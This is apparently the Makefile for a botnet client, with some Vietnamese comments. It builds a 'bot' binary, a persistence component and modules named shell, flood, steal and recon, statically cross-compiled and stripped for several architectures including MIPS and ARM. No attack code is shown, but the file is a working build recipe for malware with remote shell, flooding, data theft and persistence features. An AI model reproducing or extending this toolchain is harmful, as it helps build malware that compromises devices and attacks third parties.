# Makefile — Build bot client + modules
# Native build: make
# Cross-compile: make TARGET=<arch>

CXX ?= clang++
CXXFLAGS := -std=c++17 -O2 -s -fno-exceptions -fno-rtti
LDFLAGS := -lssl -lcrypto

SRCDIR := .
MODDIR := modules
DISTDIR := ../dist
MODDIST := $(DISTDIR)/modules

TARGET ?= native
BOT_NAME := client

# ── Platform-specific ─────────────────────────────────────
ifeq ($(TARGET),native)
    BOT_FILE := $(BOT_NAME)
    # Android Bionic: pthread/math trong libc, không có static libc
    CXXFLAGS := -std=c++17 -O2 -s -fno-exceptions -fno-rtti
    LDFLAGS := -lssl -lcrypto
else ifeq ($(TARGET),aarch64)
    CXX := aarch64-linux-gnu-g++
    BOT_FILE := $(BOT_NAME).aarch64
    CXXFLAGS := -std=c++17 -O2 -static -s -fno-exceptions -fno-rtti
    LDFLAGS := -static -lssl -lcrypto -lpthread
else ifeq ($(TARGET),arm)
    CXX := arm-linux-gnueabihf-g++
    BOT_FILE := $(BOT_NAME).arm
    CXXFLAGS := -std=c++17 -O2 -static -s -fno-exceptions -fno-rtti
    LDFLAGS := -static -lssl -lcrypto -lpthread
else ifeq ($(TARGET),x86_64)
    CXX := x86_64-linux-gnu-g++
    BOT_FILE := $(BOT_NAME).x86_64
    CXXFLAGS := -std=c++17 -O2 -static -s -fno-exceptions -fno-rtti
    LDFLAGS := -static -lssl -lcrypto -lpthread
else ifeq ($(TARGET),x86)
    CXX := i686-linux-gnu-g++
    BOT_FILE := $(BOT_NAME).x86
    CXXFLAGS := -std=c++17 -O2 -static -s -fno-exceptions -fno-rtti
    LDFLAGS := -static -lssl -lcrypto -lpthread
else ifeq ($(TARGET),mips)
    CXX := mips-linux-gnu-g++
    BOT_FILE := $(BOT_NAME).mips
    CXXFLAGS := -std=c++17 -O2 -static -s -fno-exceptions -fno-rtti
    LDFLAGS := -static -lssl -lcrypto -lpthread
else ifeq ($(TARGET),mipsel)
    CXX := mipsel-linux-gnu-g++
    BOT_FILE := $(BOT_NAME).mipsel
    CXXFLAGS := -std=c++17 -O2 -static -s -fno-exceptions -fno-rtti
    LDFLAGS := -static -lssl -lcrypto -lpthread
else
    $(error Unknown TARGET: $(TARGET))
endif

# ── Source files ──────────────────────────────────────────
MODULES := shell flood steal recon
CLIENT_SRC := client.cpp
PERSIST_SRC := persistence.cpp

# ── Targets ───────────────────────────────────────────────
.PHONY: all clean modules all-archs

all: client modules persistence

$(DISTDIR):
	mkdir -p $(DISTDIR)

$(MODDIST):
	mkdir -p $(MODDIST)

client: $(CLIENT_SRC) common.h | $(DISTDIR)
	$(CXX) $(CXXFLAGS) -o $(DISTDIR)/$(BOT_FILE) $(CLIENT_SRC) $(LDFLAGS)
	@echo "  -> $(DISTDIR)/$(BOT_FILE)"

persistence: $(PERSIST_SRC) common.h | $(DISTDIR)
	$(CXX) $(CXXFLAGS) -o $(DISTDIR)/persistence.$(TARGET) $(PERSIST_SRC) $(LDFLAGS)
	@echo "  -> $(DISTDIR)/persistence.$(TARGET)"

modules: $(MODDIST)
	@for mod in $(MODULES); do \
		$(CXX) $(CXXFLAGS) -o $(MODDIST)/$$mod $(MODDIR)/$$mod.cpp $(LDFLAGS); \
		echo "  -> $(MODDIST)/$$mod"; \
	done

clean:
	rm -rf $(DISTDIR)/client* $(DISTDIR)/persistence* $(MODDIST)

# Cross-compile cho tất cả kiến trúc
all-archs:
	@for arch in native aarch64 arm x86_64 x86 mips mipsel; do \
		echo "=== Building $$arch ==="; \
		$(MAKE) TARGET=$$arch || echo "  (skipped — toolchain not available)"; \
	done

# Quick test: build native và chạy thử
test: all
	@echo "=== Testing module shell ==="
	$(MODDIST)/shell "echo hello" 2>/dev/null || echo "  (shell module needs popen)"
	@echo "=== Testing module recon ==="
	$(MODDIST)/recon type=system 2>/dev/null || true
